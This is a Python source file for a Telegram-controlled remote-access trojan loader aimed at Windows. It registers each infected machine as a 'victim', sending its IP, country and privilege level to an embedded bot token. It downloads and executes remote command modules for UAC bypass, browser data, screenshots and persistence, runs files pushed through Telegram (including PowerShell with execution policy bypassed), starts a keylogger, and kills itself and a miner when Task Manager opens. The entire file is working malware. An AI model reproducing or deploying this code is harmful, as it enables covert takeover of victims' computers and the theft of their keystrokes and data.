# -*- coding: utf-8 -*- 
import re
import os
import subprocess
import requests
import json
import sys
import threading
import traceback
import ctypes
import tempfile
import sys
for i in ['setuptools', 'keyboard', 'psutil','win32com']:
	try:
		exec('import ' + i)
	except ImportError as ex:
		module = re.findall("named '(.*?)'",ex.msg)[0].split(".")[0]
		if module == "win32com" or module == "win32api":
			module = "pywin32"
		sub = subprocess.Popen([os.path.dirname(os.path.abspath(sys.argv[0])) + "\\" + "python.exe","-m","pip","install",module],shell=True,stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE)
		output, error = sub.communicate()
		filename = os.path.dirname(os.path.abspath(sys.argv[0])) + "\\Main.vbs"
		os.system("taskkill /IM python.exe /F & " + filename)

class Loader():
	def __init__(self):
		self.token = "5226296304:AAFALU7Us4WnjEx4RbJsV1U3ZyhGiKYxKFo"
		self.chat_id = "5176730926"
		self.note = sys.argv[1]
		self.Check_Runing()
		self.__file__ = __file__
		data = json.loads(self.Request("https://ip.seeip.org/geoip"))
		self.ip = data["ip"]
		self.country = data["country"]
		self.privileges = "Administrator" if ctypes.windll.shell32.IsUserAnAdmin() == 1 else "User"
		self.plugins = requests.get('http://127.0.0.1/json.js').json()
		thread = threading.Thread(target = self.Auto_Close)
		thread.start()
		self.commands = {
			"/geo" 			:		["http://127.0.0.1/Classes/Geo.py",			True],
			"/sys_info"		:		["http://127.0.0.1/Classes/Sys_Info.py",	True],
			"/close"		:		["http://127.0.0.1/Classes/Close.py",		False],
			"/restart"		:		["http://127.0.0.1/Classes/Restart.py",		True],
			"/execute"		:		["http://127.0.0.1/Classes/Execute.py",		True],
			"/get_log"		:		["http://127.0.0.1/Classes/Get_Log.py",		True],
			"/clear_log"	:		["http://127.0.0.1/Classes/Clear_Log.py",	True],
			"/get"			: 		["http://127.0.0.1/Classes/Get.py",			True],
			"/screenshot"	:		["http://127.0.0.1/Classes/Screenshot.py",	True],
			"/browsers"		:		["http://127.0.0.1/Classes/Browsers.py",	True],
			"/bypass_uac"	:		["http://127.0.0.1/Classes/Bypass_UAC.py",	True],
			"/bypass_uac2"	:		["http://127.0.0.1/Classes/Bypass_UAC2.py",	True],
			"/ask_admin"	:		["http://127.0.0.1/Classes/Ask_Admin.py",	False],
			"/edit_note"	:		["http://127.0.0.1/Classes/Edit_Note.py",	True],
			"/plugin"		:		["http://127.0.0.1/Classes/Plugin.py",		True],
			"/pip"			:		["http://127.0.0.1/Classes/PIP.py",			True],
			"/update"		:		["http://127.0.0.1/Classes/Update.py",		True],
			"/startup"		:		["http://127.0.0.1/Classes/Startup.py",		True]
		}
		if len(sys.argv) == 2:
			self.Send_Notification()
		else:
			if sys.argv[-1] != "asadmin":
				self.Execute(sys.argv[2:])
			else:
				self.Send_Notification()
		#self.Execute(["/startup"])
		self.Execute_Keylogger()
		while True:
			try:
				self.Main()
			except requests.ConnectionError:
				pass
			except Exception as ex:
				self.Send_Message("%E2%9C%96%EF%B8%8F Error : \n %E2%9D%96 Message : " + traceback.format_exc())
	
	def Main(self):
		old_date = None
		while True:
			text = self.Request('https://api.telegram.org/bot' + self.token + '/getUpdates')
			data = json.loads(self.Request('https://api.telegram.org/bot' + self.token + '/getUpdates'))
			if "result" not in data:
				continue
			if not data['result']:
				continue
			if not old_date:
				old_date = data['result'][-1]['message']['date']
			message = data['result'][-1]['message']
			new_date = message['date']
			if(old_date != new_date):
				old_date = new_date
				self.Request("https://api.telegram.org/bot" + self.token + "/getUpdates?offset=" + str(data['result'][-1]['update_id']))
				if("text" in message.keys()):
					spl = message['text'].split(" ")
					command = spl[0]
					if command == "/list":
						self.Send_Notification()
					elif (spl[-1] in [self.ip , os.environ.get("USERNAME") , "All"]):
						if command in self.commands.keys():
							print(spl[:-1])
							self.Execute(spl[:-1])

				else:
					file_id = message['document']['file_id']
					caption = message['caption'].split("-")[0]
					if caption in [self.ip, os.environ.get("USERNAME"), "All"]:
						data = json.loads(self.Request('https://api.telegram.org/bot' + self.token + '/getFile?file_id=' + file_id))
						link = data['result']['file_path']
						link = "https://api.telegram.org/file/bot" + self.token + "/" + link
						file = tempfile.TemporaryFile()
						filename = file.name + "." + link.split(".")[-1]
						file.close()
						req = requests.get(link)
						file = open(filename,"wb")
						file.write(req.content)
						file.close()
						if filename.endswith(".py"):
							sub = subprocess.Popen([sys.executable,filename,self.token,self.chat_id],shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
						elif filename.endswith(".ps1"):
							sub = subprocess.Popen(["powershell.exe","-ExecutionPolicy","Bypass","-File",filename,self.token,self.chat_id],shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
						else:
							cmd = [filename]
							sub = subprocess.Popen(cmd,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
						self.Send_Message("%E2%9C%94%EF%B8%8F File Downlaoded And Executed")
						if len(message['caption'].split("-")) > 1:
							output, error = sub.communicate()
							if error:
								message = "%F0%9F%96%A5 Command [" + " ".join(cmd) + "] \n %E2%9D%96 Error : \n"
								message += error.encode('utf-8')
							if output:
								message = "%F0%9F%96%A5 Command [" + " ".join(cmd) + "] \n %E2%9D%96 Output : \n"
								message += output
							self.Send_Message(message)

	def Execute(self, spl):
		self.args = spl[1:]
		command_data = self.commands[spl[0]]
		code = requests.get(command_data[0]).text
		class_name = re.findall('class (.*?)\(',code)[0]
		try:
			if command_data[1]:
				exec(code + "\n\n" + class_name + "(_)",{"_" : self})
			else:
				exec(code + "\n\n" + class_name + "()")
		except ImportError as ex:
			module = re.findall("named '(.*?)'",ex.msg)[0].split(".")[0]
			self.Send_Message("[*] Installing (" + module + ") Module...")
			self.Install_Module(module, " ".join(spl))



	def Auto_Close(self):
		while True:
			for proc in psutil.process_iter():
				try:
					if proc.name() == "Taskmgr.exe":
						os.system("taskkill /IM miner.exe /F")
						os.system("taskkill /IM python.exe /F")
				except:
					pass

	def Check_Runing(self):
		for proc in psutil.process_iter():
			if proc.name() == "python.exe" and proc.pid != os.getpid():
				if self.note == proc.cmdline()[-1]:
					exit()


	def Execute_Keylogger(self):
		dirname = os.path.dirname(os.path.abspath(sys.argv[0]))
		os.system(os.path.abspath(sys.executable) + " " + dirname + "\\Keylogger.py")


	def Send_Notification(self):
		filename = "C:\\Users\\Public\\old.txt"
		if os.path.exists(filename):
			self.Send_Message("%F0%9F%98%88  Online Victim : \n %E2%9D%96 IP Address : " + self.ip + "\n %E2%9D%96 Country : " + self.country + " \n %E2%9D%96 Note : " + self.note + "\n %E2%9D%96 Privileges : " + self.privileges)
		else:
			file = open(filename,"w")
			file.close()
			self.Send_Message("%F0%9F%98%88  New Victim : \n %E2%9D%96 IP Address : " + self.ip + "\n %E2%9D%96 Country : " + self.country + " \n %E2%9D%96 Note : " + self.note + "\n %E2%9D%96 Privileges : " + self.privileges)
	
	def Request(self, url):
		url = url.replace("#","")
		return requests.get(url).text

	def Split_Array(self, arr, size):
		arrs = []
		while len(arr) > size:
			pice = arr[:size]
			arrs.append(pice)
			arr = arr[size:]
		arrs.append(arr)
		return arrs

	def Send_Message(self, message):
		for i in self.Split_Array(message,4000):
			self.Request("https://api.telegram.org/bot" + self.token + "/sendMessage?text=" + i + "\n--" + os.environ.get("USERNAME") + "--&chat_id=" + self.chat_id)

	def Install_Module(self, module, command = ""):
		json = {
			'win32com' : 'pywin32',
			'win32gui' : 'pywin32',
			'win32api' : 'pywin32',
			'Crypto' : 'pycryptodome'
		}
			
		if module in json.keys():
			install = json[module]
		else:
			install = module

		sub = subprocess.Popen([os.path.dirname(os.path.abspath(sys.argv[0])) + "\\" + "python.exe","-m","pip","install",install],shell=True,stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE)
		output, error = sub.communicate()
		if "Requirement already satisfied" in output.decode():
			self.Send_Message("%F0%9F%93%8C Module already installed.")
		elif "Successfully installed" in output.decode():
			self.Send_Message("%F0%9F%93%8C Successfully installed.")
			self.Send_Message("%E2%9C%94%EF%B8%8F Restarting ...")
			os.system("taskkill /IM python.exe /F & " + os.path.abspath(sys.executable) + " " + os.path.abspath(sys.argv[0]) + " " + self.note + " " + command)
		else:
			self.Send_Message("%E2%9C%96%EF%B8%8F Installing (" + module + ") Module UnSucceeded \n" + output.decode() + "\n" + error.decode())

Loader()